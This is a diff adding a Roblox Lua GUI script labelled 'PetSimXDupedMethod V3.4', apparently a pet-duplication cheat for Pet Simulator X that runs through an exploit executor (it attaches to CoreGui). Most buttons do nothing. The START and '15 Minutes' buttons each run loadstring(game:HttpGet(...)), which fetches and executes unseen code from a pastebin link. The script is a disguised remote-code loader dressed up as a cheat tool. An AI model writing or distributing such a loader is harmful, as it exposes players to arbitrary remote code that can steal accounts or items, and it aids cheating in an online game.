@@ -1,0 +1,87 @@
+--
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local PetSimXDupedMethodV34 = Instance.new("TextLabel")
+local RESET = Instance.new("TextButton")
+local _5Minutes = Instance.new("TextButton")
+local _10Minutes = Instance.new("TextButton")
+local _15Minutes = Instance.new("TextButton")
+local START = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.Position = UDim2.new(0.176649749, 0, 0.186372787, 0)
+main.Size = UDim2.new(0, 236, 0, 296)
+main.Active = true
+main.Draggable = true
+
+PetSimXDupedMethodV34.Name = "PetSimXDupedMethod V3.4"
+PetSimXDupedMethodV34.Parent = main
+PetSimXDupedMethodV34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+PetSimXDupedMethodV34.Size = UDim2.new(0, 236, 0, 50)
+PetSimXDupedMethodV34.Font = Enum.Font.SourceSans
+PetSimXDupedMethodV34.Text = "PetSimXDupedMethod V3.4"
+PetSimXDupedMethodV34.TextColor3 = Color3.fromRGB(255, 255, 255)
+PetSimXDupedMethodV34.TextSize = 18.000
+
+RESET.Name = "RESET"
+RESET.Parent = main
+RESET.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+RESET.Position = UDim2.new(0, 0, 0.168918923, 0)
+RESET.Size = UDim2.new(0, 236, 0, 50)
+RESET.Font = Enum.Font.SourceSans
+RESET.Text = "RESET"
+RESET.TextColor3 = Color3.fromRGB(0, 0, 0)
+RESET.TextSize = 47.000
+
+_5Minutes.Name = "5 Minutes"
+_5Minutes.Parent = main
+_5Minutes.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+_5Minutes.Position = UDim2.new(0, 0, 0.337837785, 0)
+_5Minutes.Size = UDim2.new(0, 236, 0, 50)
+_5Minutes.Font = Enum.Font.SourceSans
+_5Minutes.Text = "5 Minutes"
+_5Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
+_5Minutes.TextSize = 47.000
+
+_10Minutes.Name = "10Minutes"
+_10Minutes.Parent = main
+_10Minutes.BackgroundColor3 = Color3.fromRGB(5, 173, 19)
+_10Minutes.Position = UDim2.new(0, 0, 0.503378391, 0)
+_10Minutes.Size = UDim2.new(0, 236, 0, 50)
+_10Minutes.Font = Enum.Font.SourceSans
+_10Minutes.Text = "10 Minutes"
+_10Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
+_10Minutes.TextSize = 47.000
+
+_15Minutes.Name = "15 Minutes"
+_15Minutes.Parent = main
+_15Minutes.BackgroundColor3 = Color3.fromRGB(0, 111, 3)
+_15Minutes.Position = UDim2.new(0, 0, 0.672297299, 0)
+_15Minutes.Size = UDim2.new(0, 236, 0, 50)
+_15Minutes.Font = Enum.Font.SourceSans
+_15Minutes.Text = "15 Minutes"
+_15Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
+_15Minutes.TextSize = 47.000
+_15Minutes.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/kwk6EQC1'))()
+end)
+
+START.Name = "START"
+START.Parent = main
+START.BackgroundColor3 = Color3.fromRGB(0, 17, 255)
+START.Position = UDim2.new(0, 0, 0.841216207, 0)
+START.Size = UDim2.new(0, 236, 0, 50)
+START.Font = Enum.Font.SourceSans
+START.Text = "START"
+START.TextColor3 = Color3.fromRGB(0, 0, 0)
+START.TextSize = 47.000
+START.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/kwk6EQC1'))()
+end)
